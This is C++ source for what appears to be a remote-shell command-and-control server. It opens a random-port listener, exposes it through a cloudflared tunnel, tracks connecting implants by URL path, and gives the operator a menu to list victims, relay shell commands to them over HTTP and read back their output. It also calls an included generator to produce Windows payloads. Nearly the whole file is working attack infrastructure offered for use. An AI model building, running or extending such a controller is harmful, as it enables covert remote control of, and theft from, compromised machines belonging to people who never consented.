#include <iostream>
#include <cstring>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <unistd.h>
#include <stdio.h>
#include <thread>
#include <future>
#include <unordered_map>
#include <string>
#include <unordered_set>
#include <vector>
#include <sstream>
#include "command.cpp"
#include "PayloadGenerator.cpp"
#include <regex>
#include <cctype>
#include<random>

using namespace std;

int PORT;
int BUFFER_SIZE = 1000000;

unordered_map<string, int> mp;
string user_input;
int client_id = 0;
string cloudflared_url;
void serve_client(string endpoint, int server_fd);
void help();


string get_endpoint(const char* buffer) {
    string request_line(buffer);

    size_t first_space = request_line.find(' ');
    if (first_space == string::npos) return "";

    size_t second_space = request_line.find(' ', first_space + 1);
    if (second_space == string::npos) return "";

    string path = request_line.substr(first_space + 1, second_space - first_space - 1);

    if (!path.empty() && path[0] == '/') {
        path = path.substr(1);
    }

    return path;
}

void shell(unordered_map<string, int>& mp, int server_fd) {
    cout << "\n[+] Welcome to Remote Shell Controller\n";
    cout << "    Type 'help' to see available commands.\n\n";

    while (true) {
        string id;
        cout << "[MainShell] > ";
        getline(cin >> ws, id);

        vector<string> tokens;
        stringstream ss(id);
        string token;

        while (getline(ss, token, ' ')) {
            tokens.push_back(token);
        }

        unordered_set<string> se(tokens.begin(), tokens.end());
        if (id == "help") {
            help();
            cout << endl;
        } else if (id == "banner") {
            banner();
            cout << endl;
        } else if (se.find("show") != se.end()) {
            show_shell(mp);
            cout << endl;
        } else if (se.find("shell") != se.end()) {
            if (mp.find(tokens[tokens.size() - 1]) != mp.end()) {
                serve_client(tokens[tokens.size() - 1], server_fd);
            } else {
                cout << "\n[-] Client ID not found.\n\n";
            }
        } 
        else if (se.find("generate")!=se.end()){
            if(se.find("os=windows")!=se.end()){
                string payload=payload_generator_windows(cloudflared_url);
                cout<<payload<<endl;
            }
            else if(se.find("os=linux")!=se.end()){
                string payload="";
                cout<<payload<<endl;
            }
            else{
                cout<<"Os does not found."<<endl;
            }
        } 

        else if(se.find("quit")!=se.end() and !se.empty()){
            string command="sudo kill $(sudo lsof -ti :"+to_string(PORT)+") 2>&1 &";
            system(command.c_str());
            break;
        }
        else {
            cout << "\n[-] Unknown command. Type 'help' to see available commands.\n\n";
        }
    }
    return;
}

void client_connect(int server_fd) {
    socklen_t addrlen;
    while (true) {
        struct sockaddr_in client_addr;
        addrlen = sizeof(client_addr);
        int client_conn = accept(server_fd, (struct sockaddr*)&client_addr, &addrlen);
        if (client_conn < 0) {
            perror("Accept failed");
            continue;
        }

        char buffer[BUFFER_SIZE] = {0};
        ssize_t valread = read(client_conn, buffer, BUFFER_SIZE - 1);
        if (valread <= 0) {
            close(client_conn);
            break;
        }

        string endpoint = get_endpoint(buffer);
        if (mp.find(endpoint) == mp.end()) {
            cout << "\n====================================\n";
            cout << "  [+] New connection: " << endpoint << "\n";
            cout << "====================================\n\n";
            cout << "[MainShell] > " << flush;
        }

        string body = "";
        mp[endpoint] = client_conn;
        string response = "HTTP/1.1 200 OK\r\n"
                          "Content-Type: text/plain\r\n"
                          "Content-Length: " + to_string(body.length()) + "\r\n"
                          "Connection: keep-alive\r\n"
                          "\r\n" + body;

        send(mp[endpoint], response.c_str(), response.length(), 0);
    }
}

string url_decode(const string& request) {
    regex result_regex("Result=([^&\\s]*)");
    smatch matches;

    if (regex_search(request, matches, result_regex)) {
        if (matches.size() > 1) {
            string encoded_value = matches[1].str();
            string decoded;

            for (size_t i = 0; i < encoded_value.size(); ++i) {
                if (encoded_value[i] == '%' && i + 2 < encoded_value.size()) {
                    int hex_value;
                    istringstream hex_stream(encoded_value.substr(i + 1, 2));
                    hex_stream >> hex >> hex_value;
                    decoded += static_cast<char>(hex_value);
                    i += 2;
                } else if (encoded_value[i] == '+') {
                    decoded += ' ';
                } else {
                    decoded += encoded_value[i];
                }
            }
            return decoded;
        }
    }
    return "";
}

void serve_client(string endpoint, int server_fd) {
    bool flag = true;

    cout << "\n[+] Entering remote shell with client '" << endpoint << "'\n";
    cout << "    Type 'quit' to return to MainShell.\n\n";

    auto input_func = [&]() {
        cout << "(Shell@" << endpoint << ") > ";
        while (flag) {
            getline(cin >> ws, user_input);

            if (user_input == "quit") {
                flag = false;
            }
        }
    };

    auto fut = async(launch::async, input_func);

    while (true) {
        string full_request;

        // Step 1: Read until \r\n\r\n --> get full headers first
        while (full_request.find("\r\n\r\n") == string::npos) {
            char buffer[BUFFER_SIZE] = {0};
            ssize_t valread = read(mp[endpoint], buffer, BUFFER_SIZE - 1);
          

            if (valread <= 0) {
                break;
            }

            full_request += string(buffer, valread);
        }

        if (full_request.empty()) {
            continue;
        }

        // Step 2: Parse Content-Length
        size_t content_length_pos = full_request.find("Content-Length:");
        size_t body_start_pos = full_request.find("\r\n\r\n");

        int content_length = 0;
        if (content_length_pos != string::npos && body_start_pos != string::npos) {
            size_t start = content_length_pos + strlen("Content-Length:");
            size_t end = full_request.find("\r\n", start);
            string length_str = full_request.substr(start, end - start);

            try {
                content_length = stoi(length_str);
            } catch (...) {
                content_length = 0;
            }
        }

        // Step 3: Read body fully
        string body_data = full_request.substr(body_start_pos + 4);  // Skip \r\n\r\n

        while ((int)body_data.length() < content_length) {
            char buffer[BUFFER_SIZE] = {0};
            ssize_t valread = read(mp[endpoint], buffer, BUFFER_SIZE - 1);

            if (valread <= 0) {
                break;
            }

            body_data += string(buffer, valread);
        }

        // Step 4: Decode and display result if POST
        if (full_request.find("POST") != string::npos and full_request.find("ERROR:")==string::npos) {
            string result = url_decode(body_data);

            if (result.size() > 3) {
                result.resize(result.size() - 3);
                cout << result << "\n(Shell@" << endpoint << ") > " << flush;
            } else {
                cout << result << "\n(Shell@" << endpoint << ") > " << flush;
            }
        }

        // Step 5: Send response (command)
        string body = user_input;
        string response = "HTTP/1.1 200 OK\r\n"
                          "Content-Type: text/plain\r\n"
                          "Content-Length: " + to_string(body.length()) + "\r\n"
                          "Connection: keep-alive\r\n"
                          "\r\n" + body;

        send(mp[endpoint], response.c_str(), response.length(), 0);
        user_input = "";

        if (flag == false) {
            break;
        }
    }

    cout << "\n[+] Exited remote shell of client '" << endpoint << "'\n\n";
}

void server() {

    int server_fd;
    struct sockaddr_in address, client_addr;
    socklen_t addrlen = sizeof(client_addr);

    server_fd = socket(AF_INET, SOCK_STREAM, 0);
    if (server_fd < 0) {
        perror("Socket creation failed");
        exit(EXIT_FAILURE);
    }

    address.sin_family = AF_INET;
    address.sin_port = htons(PORT);
    address.sin_addr.s_addr = INADDR_ANY;

    if (bind(server_fd, (struct sockaddr*)&address, sizeof(address)) < 0) {
        perror("Binding failed");
        exit(EXIT_FAILURE);
    }

    if (listen(server_fd, 10) < 0) {
        perror("Listening failed");
        exit(EXIT_FAILURE);
    }

    cout << "\n[+] HTTP server running on port " << PORT << "\n\n";

    thread client_thread(client_connect, server_fd);
    client_thread.detach();

    shell(mp, server_fd);

    close(server_fd);
}

int main() {
    
    banner();
    random_device rd;  
    mt19937 gen(rd()); 
    uniform_int_distribution<> dis(1000, 10000);
    
    PORT = dis(gen);

    cloudflared_url = start_cloudflared(PORT);
    if (cloudflared_url.size() <= 0) {
        cout << "Failed to create tunnel";
        cloudflared_url="http://127.0.0.1:"+to_string(PORT);
    }
    else{
        cout << "Tunnel created successfully" << endl;
    }
    server();
    return 0;
}